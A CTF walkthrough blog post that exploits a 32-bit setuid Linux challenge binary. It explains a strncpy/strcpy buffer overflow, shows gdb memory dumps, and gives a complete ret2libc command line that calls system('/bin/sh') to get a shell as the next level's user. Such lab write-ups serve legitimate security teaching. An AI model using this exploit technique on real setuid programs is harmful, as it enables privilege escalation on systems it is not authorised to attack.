---
title: "R0 | Pwnage Linux - Level3"
layout: post
date: 2019-08-23
tag:
- Pwnage
- x86 
- Linux
- Ret2libc
- walktrhough
- CTF 
category: blog
author: Srbx7
description: R0 | Pwnage Linux - Level3
---


`# file level3`

```
level3: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.26, BuildID[sha1]=2336e9f02b6ccbbcccd445196c761004ba06c764, with debug_info, not stripped
```

> Has a setuid

> Is an ELF 32-bit LSB exec

> Is compile for Intel x86 processors


`# checksec level3`

```
[*] '/root/ringzer0team/pwnageLinux/level3/level3'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

`# cat /levels/level3.c`

```c
// Created by Hidden (hidden@undernet.org)

#include <stdio.h>
#include <stdlib.h>
#include <string.h>


char* concat(char *buf, char *s1, char *s2)
{
	// Copy s1 to buf
	strcpy(buf, s1);
	// Append s2 to s1 into buf
	strcat(buf, s2);
	return buf;
}


int main(int argc, char **argv)
{
	char buf[256];
	char buf1[128];
	char buf2[128];

	if (argc != 3)
		return 0;

	// Copy argv[1] to buf1 and argv[2] to buf2
	strncpy(buf1, argv[1], sizeof(buf1));
	strncpy(buf2, argv[2], sizeof(buf2));

	concat(buf, buf2, buf1);
	printf("String result: %s\n", buf);
	return 0;
}
```

> Well okay, if it's not already perceived, a good exercise would be for you to spot any anomaly, a use that differs from one point to another in this code...

> Need a hint? Okay, what differs from `strcpy()` and `strncpy()` ?

Problem w/ `strncpy( char *dest, const char *src, size_t n )`: If there is no null character among the first n character of src, the string placed in dest will not be null-terminated. So `strncpy()` does not guarantee that the destination string will be NULL terminated. Hence, its buffer memory can't be directly overflow.

Problem w/ `strcpy( char *dest, const char *src )`: The `strcpy()` function does not specify the size of the destination array, so buffer overrun is often a risk (as `strcat and strcmp`).

Fine! By fulling the `buf2` buffer w/o null byte, it's possible to overflow the `buf`. In other words, since `buf1` is right next (below) `buf2` on the stack and `strcpy` function stop copying when it gets a null char, `buf2` will looks something like `buf2` + `buf1`.

```
|      128      | arg2 -> buf2 -> s1
|      128      | arg1 -> buf1 -> s2
|      256      | buf 
|      ...      | 
| return_adress |
```

```bash
(gdb) r A `python -c 'print "\x42" * 127'`
(...)
Breakpoint 2, main (argc=3, argv=0xffffdc94) at level3.c:31
31		concat(buf, buf2, buf1);
(gdb) x/100wx $eax-100
0xffffd98c:	0x00000000	0xf7ffd000	0x08048260	0xf7ffd000
0xffffd99c:	0xf7ffd53c	0xffffd9b8	0xf7e219f8	0x00000000
0xffffd9ac:	0xffffdaa4	0xf7fe87eb	0x00000000	0xf7fcc000
0xffffd9bc:	0xf7fcc000	0xffffdbf8	0xf7feeff0	0xffffdc24
0xffffd9cc:	0xf7ea357c	0xf7fcc000	0xf7fcc000	0x00000000
0xffffd9dc:	0x0804854a	0xffffd9f0	0xffffddd0	0x00000080
0xffffd9ec:	0xf7fe2f60	0x42424242	0x42424242	0x42424242
0xffffd9fc:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffda0c:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffda1c:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffda2c:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffda3c:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffda4c:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffda5c:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffda6c:	0x00424242	0x00000041	0x00000000	0x00000000 <---------- * 128th byte is B
```

```bash
(gdb) r A `python -c 'print "\x42" * 128'`
...
Breakpoint 2, main (argc=3, argv=0xffffdc94) at level3.c:31
31		concat(buf, buf2, buf1);
(gdb) x/100wx $eax-100
0xffffd98c:	0x00000000	0xf7ffd000	0x08048260	0xf7ffd000
0xffffd99c:	0xf7ffd53c	0xffffd9b8	0xf7e219f8	0x00000000
0xffffd9ac:	0xffffdaa4	0xf7fe87eb	0x00000000	0xf7fcc000
0xffffd9bc:	0xf7fcc000	0xffffdbf8	0xf7feeff0	0xffffdc24
0xffffd9cc:	0xf7ea2a15	0xf7fcc000	0xf7fcc000	0x00000000
0xffffd9dc:	0x0804854a	0xffffd9f0	0xffffddcd	0x00000080
0xffffd9ec:	0xf7fe2f60	0x42424242	0x42424242	0x42424242
0xffffd9fc:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffda0c:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffda1c:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffda2c:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffda3c:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffda4c:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffda5c:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffda6c:	0x42424242	0x00000041	0x00000000	0x00000000 <---------- * 128th byte is \x42
```

Since `buf2` has to be exactly 128-byte w/o null char (e.g.: bigger values are just going to be ignored by `strncpy` function), let's play w/ `buf1` and fuzz values to crash the program.

```bash
level3@lxc-pwn-x86:/levels$ ./level3 `python -c 'print "\x41" * 69'` `python -c 'print "\x42" * 128'`
String result: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

level3@lxc-pwn-x86:/levels$ ./level3 `python -c 'print "\x41" * 70'` `python -c 'print "\x42" * 128'`
String result: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```

Several methods can make it possible to execute arbitrary code, in particular by using a global variable in which there is a shellcode and the address is known beforehand. Although, I prefered to play a bit more with the basic gdb commands on the server to get more familiar w/ the basics and `ret2libc`.

```bash
(gdb) print system
$1 = {<text variable, no debug info>} 0xf7e56940 <system>
(gdb) find 0xf7e56940, +99999999999, "/bin/sh"
0xf7f7502b
warning: Unable to access 16000 bytes of target memory at 0xf7fcedb3, halting search.
1 pattern found.
```

Exploit this binary! ;)

```bash
level3@lxc-pwn-x86:/levels$ ./level3 `python -c 'print "\x41" * 64 + "\x40\x69\xe5\xf7"+ "CCCC"  + "\x2b\x50\xf7\xf7"'` `python -c 'print "\x42" * 128'`
String result: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@i��CCCC+P��AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@i��CCCC+P��
level4@lxc-pwn-x86:/levels$ wc -l /home/level4/.pass
1 /home/level4/.pass
level4@lxc-pwn-x86:/levels$ 
```
